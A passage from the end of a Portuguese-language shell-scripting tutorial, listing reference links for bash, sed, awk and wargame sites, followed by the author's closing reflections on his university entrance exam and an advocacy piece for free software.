+Programação de Shell Scripts --> um texto introdutório feito pelo Nibble.
+                                 Pode ser encontrado em
+                       http://unsekurity.virtualave.net/txts/shscript.txt
+
+UNIX Bourne Shell Programming --> meio antiguinho (1991). mas mesmo assim 
+                                  me foi útil. Veja em
+                                  http://www.torget.se/users/d/Devlin/shell
+
+Bash FAQ --> dispensa descrições. ftp://ftp.cwru.edu/pub/bash/FAQ
+
+Bash Reference Manual --> documentação oficial da GNU
+                          http://www.gnu.org/manual/bash-2.02/bashref.html
+
+Bourne-Again SHell Home Page --> Página oficial do Bourne-Again Shell em:
+                        http://cnswww.cns.cwru.edu/~chet/bash/bashtop.html
+
+sh.underlinux.com.br --> Contém alguns materiais legais e scripts de
+                         exemplos, muito útil!
+                         http://sh.underlinux.com.br
+
+Expressões Regulares --> Um guia sobre expressões regulares (sim! em
+                         português!). Leitura obrigatória! (esse aurélio
+                         é demais mesmo!) =)
+                         http://guia-er.sourceforge.net
+
+sed-HOWTO --> Um ótimo texto ensinando sobre o sed! Outra leitura
+              obrigatória! (e outro produto fabricado sob a chancela do
+              aurélio! esse cara deve estar com o saco esticadinho de
+              tanto que eu puxo... =D )
+              http://verde666/sed
+
+Lista de discussão sobre ShellScript --> Precisa falar algo? :P
+                              http://br.groups.yahoo.com/group/shell-script
+
+Programação em Shell Script --> um texto feito pelo xf. Tem algumas coisas
+                                interessantes.
+                                http://www.jonathas.com.br/manual-shell.txt
+
+Teach Yourself Shell Programming in 24 Hours --> Apesar do título
+                                presunçoso, o livro é bonzinho. O começo
+                                é meio chato, mas depois tem algumas
+                                coisas úteis. Versão online em
+                 http://library.cs.tuiasi.ro/0/linux-unix-programming.html
+
+UNIX Power Tools -> Livro muito bom com várias matérias sobre UNIX em
+                    geral. Tem um capítulo sobre shell scripting.
+                    http://docs.online.bg/OS/unix_power_tools/index.htm
+
+Linux: Programação Shell -> Um livrinho interessante que ensina umas
+                            coisas legais sobre shellscript. Eu encontrei
+                            alguns dados errados e/ou incoerentes no
+                            livro, mas isso acontece... Deve haver muitos
+                            casos parecidos neste meu texto aqui... =P
+                            O ponto forte do livro é o Apêndice sobre
+                            o awk, assunto que, diga-se de passagem, é
+                            muito difícil de encontrar em português.
+                            Espero que o autor do livro não me odeie pelo
+                            que eu vou falar agora (só estou sendo
+                            sincero): não vale a pena comprar o livro se
+                            você tem acesso a internet! Na net, e até
+                            mesmo nas manpages, você pode aprender as
+                            mesmas coisas e muito mais. Só compre o livro
+                            se tiver preguiça de fuçar essa rede
+                            maravilhosa que nós temos.
+                            Não é pra boicotar o livro! Meta a cara numas
+                            bibliotecas e pegue-o pra consultar! (de
+                            preferência sem gastar dinheiro...)
+                            [aê Julio, por favor não me odeie! ;-) ]
+                            Editora: Brasport http://www.brasport.com.br
+                            Autor: Julio Cezar Neves
+                            ISBN: 85-7452-076-4
+
+Verdade Absoluta --> Você poderá encontrar um material diversificado
+                     sobre UNIX, pode encontrar por exemplo um material
+                     introdutório à awk.
+                     http://www.absoluta.org
+
+Phrack Extraction Utility --> O utilitário para extração dos
+                              códigos-fonte contidos neste texto pode ser
+                              encontrado na última versão da Phrack em
+                              http://www.phrack.org
+                              (acho que o Meleu Extraction Utility pode
+                              perfeitamente suprir suas necessidades, mas
+                              é bom lembrar que os créditos são da Phrack)
+
+www.lockabit.coppe.ufrj.br -,-> Dê uma olhada aqui se quiser saber sobre
+www.pulltheplug.com --------|   wargames.
+www.hackerslab.org ---------'
+
+
+   Você ainda pode aprender muito lendo outros códigos prontos! Veja
+alguns em:
+
+http://www.inf.ufpr.br/~asr98/linux/scripts_prog.html
+http://sh.underlinux.com.br/src/index.htm
+http://verde666.org
+http://meleu.da.ru
+
+
+Outros endereços interessantes:
+~~~~~~ ~~~~~~~~~ ~~~~~~~~~~~~~
+http://unsekurity.virtualave.net
+http://eoh-team.tk
+
+
+
+-------------------------------------------------------------------------
+
+
+
+11. Considerações Finais
+    ********************
+
+   OBS.: Nesta seção não tem nada sobre shell script. É apenas uma
+conversa...
+
+   UFA!! Deve fazer aproximadamente um ano que eu comecei a escrever este
+texto! É isso mesmo! E aí cheguei naquela fase de nossa vida onde pagamos
+por nossos pecados: vestibular. Cheguei a pensar que nunca ia terminar
+este texto, ficava estudando pro vest o tempo todo não tinha tempo pra
+ficar no computador. Não adiantou muita coisa, eu não passei... Deve ser
+porque eu pequei demais e tenho que ficar mais um ano pagando por isso...
+Bom, chega de ficar me lamentando! Vou parar de lamentar e ficar mais um
+ano estudando...
+
+   Sabe de uma coisa?... As vezes conversando com outras pessoas sobre
+o movimento FreeSoftware algumas acham que é maluquice, que a gente é
+otário de ficar trabalhando de graça, sem ganhar nada. Deixa eu contar
+uma coisa... Eu estou aqui, num computador com uma configuração de
+hardware razoável e que daqui a alguns meses já será considerada por
+muitos como "imprestável". Mas veja bem: "considerada por muitos". Pra
+mim essa máquina ainda vai durar alguns anos com esta mesma configuração.
+E sabe por quê? Software Livre meu caro, Software Livre...
+   Já parou pra ver como que os FreeSoftwares rodam bem em máquinas que
+não são das mais "turbinadas"? Por que será que os softwares da Micro$oft
+precisam de hardware cada vez mais potentes? Um programador que trabalha
+na Micro$oft não deve ser nenhum José Mané, será que ele não tem
+capacidade de escrever um software levinho? Será que essas megaempresas
+de software não têm algum esquema com megaempresas de hardware? Estes
+softwares são pesados porque necessitam ser assim ou isso é de propósito?
+   Ficam essas perguntas no ar...
+   Mas voltando ao FreeSoftware. Minha modesta maquininha aqui vai durar
+anos porque eu uso FreeSoftware e esse tipo de software não precisa ser
+pesado, não precisa ter interfaces que encham nossos olhos com tanta
+beleza, não precisa de marketing, não precisa derrubar o concorrente. A
+única coisa que o FreeSoftware precisa fazer é aquilo que ele se presta a
+fazer. Sem firulas ou outras gracinhas.
+
+   Mas por que diabos uma pessoa faz FreeSoftware? Vou responder de uma
+maneira que pessoas de qualquer idade e qualquer região do Brasil
+entendenda: Porque programar é legal! É arretado de bão! É maneiro! É
+bacana! É massa! É bom pra chuchu! É uma brasa, mora?
+   Algumas pessoas amam programar. E também amam quando alguém gosta
+de seus programas, amam mais ainda quando muitas pessoas usam e gostam de
+seus programas.
+   E se o cara pegou um programa e gostou muito dele, mas acha que está
+faltando aquela funcionalidade. Ele pode pegar o código-fonte e
+implementar a funcionalidade desejada por si próprio. Pois FreeSoftware
+tem que ter código-fonte.
+   Outra coisa interessante é que você não precisa pagar pelo
+FreeSoftware! Isso mesmo! Não precisa pagar pelo software!! Você estuda
+numa escola que tem um laboratório de informática? Já parou pra pensar em
+quanto dinheiro foi gasto para pagar a licença de todas aquelas máquinas
+rodando Micro$oft Windows, Micro$oft Office, etc. Imagine se todas
+aquelas máquinas usassem Software Livre. UAU!! Quanto dinheiro
+economizado!!! Agora vamos mais longe... Imagine os departamentos
+públicos, tente mentalizar quantos computadores existem nestes
+departamentos. Muitos, né? Agora pense no dinheiro gasto com as licenças.
+Muito também... Agora uma coisa que você pode não ter pensado é que esse
+dinheiro é PÚ-BLI-CO! É seu dinheiro! É nosso dinheiro!
+   Se o governo usasse Software Livre, não gastaria rios de dinheiro com
+licenças de softwares proprietários. E o dinheiro economizado poderia ser
+investido, por exemplo, no setor de educação básica. Dando mais valor aos
+professores, aqueles profissionais que formarão os profissionais de
+amanhã... E se o governo investisse o que devia em educação não iria
+precisar ficar inventando essa tal de cota pra gente que tem pele dessa ou
+daquela cor. As pessoas teriam acesso a educação e chances para aprender
+a ser um bom profissional.
+
+   Algumas pessoas podem falar "Ai que gracinha, o meleu é tão sonhador."
+ou até mesmo "Putz! Coitado desse meleu. Quando ele precisar pagar suas
+contas ele vai mudar de idéia.". Bom... é por causa de "sonhadores" como
+eu que você está lendo esse texto. É por causa deles que você usa a
+Internet. E é por causa desses "malucos-que-trabalham-de-graça" que eu
+sei tudo que sei. Eu não tenho dinheiro pra gastar fazendo cursos, tudo
+que aprendi veio da Internet, com material preparado por estes "malucos".
+E aqui estou eu, mais um "maluco-que-trabalha-de-graça", disponibilizando
+material pra você usar livremente, da maneira que achar melhor!
+   Espero que você também se torne uma dessas pessoas que acham que podem
+fazer algum trabalho de útil para outras pessoas e não ficar apenas se
+preocupando em acumular riquezas.
+
+   Mais informações sobre FreeSoftware em http://www.gnu.org
+
+   Como diriam "nuestros hermanos": Hasta luego.
+
+
+-------------------------------------------------------------------------
